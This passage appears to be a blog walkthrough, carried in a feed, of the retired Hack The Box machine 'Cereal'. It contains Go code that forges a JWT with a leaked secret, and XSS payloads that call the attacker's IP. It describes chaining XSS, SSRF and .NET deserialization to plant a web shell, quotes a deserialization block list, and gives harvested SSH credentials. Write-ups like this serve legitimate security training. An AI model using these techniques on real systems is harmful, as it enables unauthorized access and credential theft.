+<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
+<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
+<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
+<ul>
+<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
+</ul>
+</li>
+</ul>
+<p>And here are the tactics to bypass the login page:</p>
+<ul>
+<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
+<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
+<li>Simply refresh the page afterwards and see if it logs me in.</li>
+</ul>
+<h4 id="forge-jwt">Forge JWT</h4>
+<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang. Here is the code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
+
+<span class="kn">import</span> <span class="p">(</span>
+	<span class="s">&#34;encoding/json&#34;</span>
+	<span class="s">&#34;fmt&#34;</span>
+	<span class="s">&#34;time&#34;</span>
+
+	<span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
+<span class="p">)</span>
+
+<span class="kd">type</span> <span class="nx">UserService</span> <span class="kd">interface</span> <span class="p">{</span>
+	<span class="nf">CreateToken</span><span class="p">(</span><span class="nx">userID</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span>
+<span class="p">}</span>
+
+<span class="kd">type</span> <span class="nx">jwtService</span> <span class="kd">struct</span> <span class="p">{</span>
+	<span class="nx">secretKey</span> <span class="kt">string</span>
+<span class="p">}</span>
+
+<span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">jwtService</span><span class="p">)</span> <span class="nf">CreateToken</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="nx">claims</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span><span class="p">{</span>
+		<span class="nx">ExpiresAt</span><span class="p">:</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">AddDate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">).</span><span class="nf">UTC</span><span class="p">().</span><span class="nf">Unix</span><span class="p">(),</span>
+	<span class="p">}</span>
+
+	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
+	<span class="nx">t</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">secretKey</span><span class="p">))</span>
+	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nx">t</span>
+<span class="p">}</span>
+
+<span class="kd">type</span> <span class="nx">User</span> <span class="kd">struct</span> <span class="p">{</span>
+	<span class="nx">UserId</span>   <span class="kt">string</span> <span class="s">`json:&#34;userId,omitempty&#34;`</span>
+	<span class="nx">Username</span> <span class="kt">string</span> <span class="s">`json:&#34;username,omitempty&#34;`</span>
+	<span class="nx">Token</span>    <span class="kt">string</span> <span class="s">`json:&#34;token,omitempty&#34;`</span>
+<span class="p">}</span>
+
+<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="nx">jwt</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">jwtService</span><span class="p">{}</span>
+	<span class="nx">jwt</span><span class="p">.</span><span class="nx">secretKey</span> <span class="p">=</span> <span class="s">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>
+
+	<span class="nx">cu</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{</span>
+		<span class="nx">UserId</span><span class="p">:</span>   <span class="s">&#34;1&#34;</span><span class="p">,</span>
+		<span class="nx">Username</span><span class="p">:</span> <span class="s">&#34;iamf&#34;</span><span class="p">,</span>
+		<span class="nx">Token</span><span class="p">:</span>    <span class="nx">jwt</span><span class="p">.</span><span class="nf">CreateToken</span><span class="p">(),</span>
+	<span class="p">}</span>
+
+	<span class="nx">currentUser</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nf">Marshal</span><span class="p">(</span><span class="nx">cu</span><span class="p">)</span>
+	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">currentUser</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div><p>It produces the following output.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «cereal» «10.10.14.3»
+$ go run main.go
+<span class="o">{</span><span class="s2">&#34;userId&#34;</span>:<span class="s2">&#34;1&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;iamf&#34;</span>,<span class="s2">&#34;token&#34;</span>:<span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span class="o">}</span>
+</code></pre></div><h4 id="login">Login</h4>
+<p>At <code>https://cereal.htb</code>, I&rsquo;ll create a new local storage with a key name of  <code>currentUser</code> and I&rsquo;ll put the previous output as the key&rsquo;s value. When I refresh the site, it logs me in.</p>
+<p><div class="img-container"><img src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  /></div>
+</p>
+<h4 id="input-testing">Input testing</h4>
+<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
+<p><div class="img-container"><img src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  /></div>
+</p>
+<p>Here how the request and the response looklike.</p>
+<p><div class="img-container"><img src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  /></div>
+</p>
+<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
+<blockquote>
+<p>I decided to mix it with images hehe.</p>
+</blockquote>
+<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
+<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation.</p>
+<p><div class="img-container"><img src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  /></div>
+</p>
+<p>Actually, there is a client-side validation, but it could easily be bypassed with Burp repeater. For example, I could send a cereal request in different structure:</p>
+<p><div class="img-container"><img src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  /></div>
+</p>
+<p>The cereal database&rsquo;s name can be found inside <code>CerealContext.cs</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  /></div>
+</p>
+<p>Looking back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen upon comparing the commit logs):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
+<span class="na">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
+<span class="na">        [HttpGet(&#34;{id}&#34;)]</span>
+        <span class="k">public</span> <span class="n">IActionResult</span> <span class="n">Get</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
+            <span class="p">{</span>
+                <span class="kt">string</span> <span class="n">json</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Requests</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">RequestId</span> <span class="p">==</span> <span class="n">id</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">().</span><span class="n">JSON</span><span class="p">;</span>
+                <span class="c1">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
+</span><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;objectdataprovider&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;windowsidentity&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;system&#34;</span><span class="p">))</span>
+                <span class="p">{</span>
+                    <span class="k">return</span> <span class="n">BadRequest</span><span class="p">(</span><span class="k">new</span> <span class="p">{</span> <span class="n">message</span> <span class="p">=</span> <span class="s">&#34;The cereal police have been dispatched.&#34;</span> <span class="p">});</span>
+                <span class="p">}</span>
+                <span class="kt">var</span> <span class="n">cereal</span> <span class="p">=</span> <span class="n">JsonConvert</span><span class="p">.</span><span class="n">DeserializeObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span> <span class="k">new</span> <span class="n">JsonSerializerSettings</span>
+                <span class="p">{</span>
+                    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">Auto</span>
+                <span class="p">});</span>
+                <span class="k">return</span> <span class="n">Ok</span><span class="p">(</span><span class="n">cereal</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+</code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="na">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
+<span class="na">[HttpGet(&#34;{id}&#34;)]</span>
+</code></pre></div><p>This line blocks the gadget classes used for .NET deserialization attack.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">if</span> <span class="o">(</span>json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;objectdataprovider&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;windowsidentity&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;system&#34;</span><span class="o">))</span>
+</code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
+    <span class="k">public</span> <span class="k">class</span> <span class="nc">DownloadHelper</span>
+    <span class="p">{</span>
+        <span class="k">private</span> <span class="n">String</span> <span class="m">_</span><span class="n">URL</span><span class="p">;</span>
+        <span class="k">private</span> <span class="n">String</span> <span class="m">_F</span><span class="n">ilePath</span><span class="p">;</span>
+        <span class="k">public</span> <span class="n">String</span> <span class="n">URL</span>
+<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
+        <span class="k">private</span> <span class="k">void</span> <span class="n">Download</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="k">using</span> <span class="p">(</span><span class="n">WebClient</span> <span class="n">wc</span> <span class="p">=</span> <span class="k">new</span> <span class="n">WebClient</span><span class="p">())</span>
+            <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="m">_</span><span class="n">URL</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="m">_F</span><span class="n">ilePath</span><span class="p">))</span>
+                <span class="p">{</span>
+                    <span class="n">wc</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="m">_</span><span class="n">URL</span><span class="p">,</span> <span class="n">ReplaceLastOccurrence</span><span class="p">(</span><span class="m">_F</span><span class="n">ilePath</span><span class="p">,</span><span class="s">&#34;\\&#34;</span><span class="p">,</span> <span class="s">&#34;\\21098374243-&#34;</span><span class="p">));</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
+<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
+<h4 id="xss-vulnerability">XSS Vulnerability</h4>
+<p>When tracking down where the previous GET request came from, I found out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
+<p><div class="img-container"><img src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  /></div>
+</p>
+<p>And one of the app library used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
+<span class="o">&lt;</span><span class="nx">Accordion</span><span class="p">.</span><span class="nx">Toggle</span> <span class="nx">as</span><span class="o">=</span><span class="p">{</span><span class="nx">Button</span><span class="p">}</span> <span class="nx">variant</span><span class="o">=</span><span class="s2">&#34;link&#34;</span> <span class="nx">eventKey</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;expand&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span><span class="o">&gt;</span>
+    <span class="p">{</span><span class="nx">requestData</span> <span class="o">&amp;&amp;</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">==</span> <span class="s1">&#39;string&#39;</span> <span class="o">&amp;&amp;</span> 
+        <span class="o">&lt;</span><span class="nx">MarkdownPreview</span> <span class="nx">markedOptions</span><span class="o">=</span><span class="p">{{</span> <span class="nx">sanitize</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}}</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span><span class="p">}</span> <span class="o">/&gt;</span> <span class="c1">// &lt;==
+</span><span class="c1"></span><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
+</code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
+<pre tabindex="0"><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
+</code></pre><p><div class="img-container"><img src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  /></div>
+</p>
+<p>With a few experiments, URL encoding seems to work as well</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown">[<span class="nt">XSS</span>](<span class="na">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-sonny">Shell as Sonny</h3>
+<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
+<p>Putting it all together:</p>
+<ul>
+<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
+<li>The gadget classes for deserialization attack are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
+<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
+</ul>
+<p>The tactics:</p>
+<ul>
+<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
+<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
+<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
+</ul>
+<p>I&rsquo;ve made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain these vulnerabilities (XSS, SSRF, and Deserialization). The results is as follow:</p>
+<p><div class="img-container"><img src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  /></div>
+</p>
+<blockquote>
+<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
+</blockquote>
+<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  /></div>
+</p>
+<h4 id="ssh---sonny">SSH - sonny</h4>
+<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
+<p><div class="img-container"><img src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  /></div>
+</p>
+<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.2» 
+$ ssh sonny@cereal.htb
+sonny@cereal.htb&#39;s password: 
+Microsoft Windows [Version 10.0.17763.1817]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+sonny@CEREAL C:\Users\sonny&gt;dir desktop\ 
+ Volume in drive C has no label.                   
+ Volume Serial Number is C4EF-2153                 
+                                                   
+ Directory of C:\Users\sonny\desktop               
+                                                   
+11/16/2020  05:19 AM    &lt;DIR&gt;          .           
+11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
+06/07/2021  09:59 PM                34 user.txt    
+               1 File(s)             34 bytes      
+               2 Dir(s)   7,621,619,712 bytes free 
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>It&rsquo;s retired already.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
+<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
+<li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
 </ul>
 ]]></content:encoded>
     </item>
